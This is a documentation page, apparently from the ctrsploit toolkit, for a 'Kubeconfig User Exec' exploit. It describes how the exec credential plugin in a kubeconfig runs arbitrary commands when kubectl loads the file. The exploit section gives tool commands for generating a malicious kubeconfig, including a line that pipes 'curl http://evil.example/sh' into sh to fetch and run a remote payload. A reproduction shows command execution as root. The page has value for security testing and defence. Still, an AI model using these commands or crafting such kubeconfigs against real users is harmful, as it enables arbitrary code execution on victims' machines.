---
maintainer:
    - ssst0n3
---
# Kubeconfig User Exec

## 1. Vulnerability Overview

Kubernetes kubeconfig files support `users[].user.exec`, a credential-plugin
mechanism where `client-go` (and tools built on it, e.g. `kubectl`) executes a
local helper binary to obtain authentication credentials.

`client-go` runs the configured `exec.command` **before** making any network
request. Loading an untrusted kubeconfig therefore allows the kubeconfig author
to execute arbitrary commands on the victim's machine — the kubeconfig file
itself is a command-injection vector.

## 2. Exploit Scenario

An attacker tricks a victim into loading a malicious kubeconfig. Any `kubectl`
command using that kubeconfig will execute the attacker's payload client-side
before the tool even contacts the cluster.

## 3. Prerequisites

None. The exploit only needs to write a file — it does not require a running
Kubernetes cluster.

## 4. Exploit

Generate a malicious kubeconfig that executes `--cmd` when loaded.

```bash
ctrsploit vul kubeconfig user-exec exploit -c 'touch /tmp/pwned'
ctrsploit vul kubeconfig user-exec exploit -c 'curl http://evil.example/sh | sh' -o evil.yaml
```

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

[dqd: kubernetes/v1.35.1](https://github.com/ctrsploit/dqd/tree/main/kubernetes/v1.35.1/containerd/v2.2.1/calico/default)

```bash
dqd up kubernetes/v1.35.1/containerd/v2.2.1/calico/default
dqd ssh kubernetes/v1.35.1/containerd/v2.2.1/calico/default
```

<details><summary>env details</summary>

```bash
root@kubernetes-1-35-1:~# kubectl version --client
Client Version: v1.35.1
Kustomize Version: v5.8.0
root@kubernetes-1-35-1:~# containerd --version
containerd github.com/containerd/containerd/v2 v2.2.1
root@kubernetes-1-35-1:~# cat /etc/os-release
NAME="Ubuntu"
VERSION="24.04.4 LTS (Noble Numbat)"
```

</details>

### 5.2 Reproduce Steps

```bash
# 1. Generate a malicious kubeconfig
$ ctrsploit vul kubeconfig user-exec x -c 'id > /tmp/whoami'
WARN  --output not set, saving to malicious-kubeconfig.yaml
INFO  Malicious kubeconfig written to /root/malicious-kubeconfig.yaml

# 2. Load it with kubectl — client-go runs the exec plugin before
#    making any network request to https://malicious.example
$ kubectl --kubeconfig malicious-kubeconfig.yaml get pods
Unable to connect to the server: getting credentials: exec plugin is
configured to use API version client.authentication.k8s.io/v1beta1,
plugin returned version client.authentication.k8s.io/__internal

# 3. The exec plugin still executed the command
$ cat /tmp/whoami
uid=0(root) gid=0(root) groups=0(root)
```
